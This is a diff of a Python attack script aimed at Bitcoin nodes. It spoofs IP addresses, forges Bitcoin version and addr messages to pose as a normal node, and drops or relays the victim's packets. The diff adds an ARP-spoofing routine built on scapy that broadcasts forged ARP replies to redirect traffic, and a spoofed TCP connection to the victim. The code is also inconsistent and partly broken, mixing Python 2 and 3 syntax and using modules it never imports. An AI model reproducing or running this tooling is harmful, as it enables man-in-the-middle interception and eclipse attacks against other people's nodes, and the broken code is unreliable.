@@ -1,13 +1,17 @@
 from _thread import start_new_thread
 from scapy.all import *
+import socket
 import atexit
 import json
 import os
-
-
-import socket, time, bitcoin
+import time
+import bitcoin
 from bitcoin.messages import *
 from bitcoin.net import CAddress
+
+from teeceepee.tcp import TCPSocket
+from teeceepee.tcp_listener import TCPListener
+
 
 
 # Percentage (0 to 1) of packets to drop, else: relayed to victim
@@ -28,7 +32,7 @@ spoof_IP_and_ports = []
 spoof_IP_sockets = []
 
 iptables_file_path = f'{os.path.abspath(os.getcwd())}/backup.iptables.rules'
-
+"""
 def ip_alias(ip_address):
 	print(f'Setting up IP alias {ip_address}')
 	global alias_num
@@ -39,7 +43,7 @@ def ip_alias(ip_address):
 	#terminal(f'iptables -A INPUT -p tcp -s {ip_address} -j ACCEPT')
 	#terminal(f'iptables -A OUTPUT -p tcp -d  {ip_address} -j ACCEPT')
 	alias_num += 1
-
+"""
 def terminal(cmd):
 	# print('\n> '+cmd)
 	print(os.popen(cmd).read())
@@ -60,7 +64,7 @@ def version_packet(src_ip, dst_ip, src_port, dst_port):
 	# Default is /python-bitcoinlib:0.11.0/
 	msg.strSubVer = bitcoin_subversion.encode() # Look like a normal node
 	return msg
-
+"""
 def custom_packet(msgtype, src_ip, dst_ip, src_port, dst_port):
 	msg = None
 	if msgtype == 'version':
@@ -123,6 +127,7 @@ def custom_packet(msgtype, src_ip, dst_ip, src_port, dst_port):
 	#msg.addrTo.ip = dst_ip
 	#msg.addrTo.port = dst_port
 	return msg
+"""
 
 # str_addrs = ['1.2.3.4', '5.6.7.8', '9.10.11.12'...]
 def addr_packet(str_addrs):
@@ -134,19 +139,41 @@ def addr_packet(str_addrs):
 		addr.nTime = int(time.time())
 		addr.ip = i
 
-		addrs.append( addr )
+		addrs.append(addr)
 	msg.addrs = addrs
 	return msg
 
+# Make web traffic go towards the fake IP
+def arp_spoof(fake_ip, mac_address):
+	try:
+		for _ in xrange(5):
+			srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(psrc=fake_ip, hwsrc=mac_address), verbose=0, timeout=0.05)
+			time.sleep(0.05)
+	except socket.error:
+		# Are you sure you're running as root?
+		print 'ERROR: You need to run this script as root.'
+		sys.exit()
+
+def get_mac_address(ifname):
+	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+	info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', ifname[:15]))
+	return ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
+
 def initialize_fake_connection(src_ip, dst_ip):
 	########## Temporary
-	src_ip = attacker_ip
+	#src_ip = attacker_ip
 	##########
 	src_port = attacker_port
 	dst_port = victim_port
 
 	print(f'Spoofing with IP {src_ip}:{src_port} to IP {dst_ip}:{dst_port}')
 
+	mac_address = get_mac_address(network_interface)
+	arp_spoof(attacker_ip, mac_address)
+
+	listener = TCPListener(fake_ip)
+    s = TCPSocket(listener)
+    s.connect(victim_ip, victim_port)
 
 	"""seq = random.randrange(0,2**16)
 	ip = IP(src=src_ip, dst=dst_ip)
@@ -166,18 +193,16 @@ def initialize_fake_connection(src_ip, dst_ip):
 	send(version_packet(src_ip, dst_ip, dst_port).to_bytes())
 	"""
 
-	ip_alias(src_ip)
+	#ip_alias(src_ip)
 
 
-	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	#s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) #socket.AF_PACKET, socket.SOCK_RAW) #socket.AF_INET, socket.SOCK_STREAM)
-	#s.bind((src_ip, src_port))
-	#s.listen(1) # Queue up to 1 request
+	#s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	#s.connect((dst_ip, dst_port))
 
-	s.connect((dst_ip, dst_port))
 	# Send version packet
 	version = version_packet(src_ip, dst_ip, src_port, dst_port)
 	print(version)
+
 	s.send(version.to_bytes())
 	# Get verack packet
 	print('\n\n*** ')
@@ -189,7 +214,7 @@ def initialize_fake_connection(src_ip, dst_ip):
 	s.send(verack.to_bytes())
 	# Get verack packet
 	print('\n\n*** ')
-	print(s.recv(1024)) # Next message received must be <= 1024 bytes
+	print(s.recv(1024, timeout=30)) # Next message received must be <= 1024 bytes
 
 
 	spoof_IP_and_ports.append((src_ip, src_port))
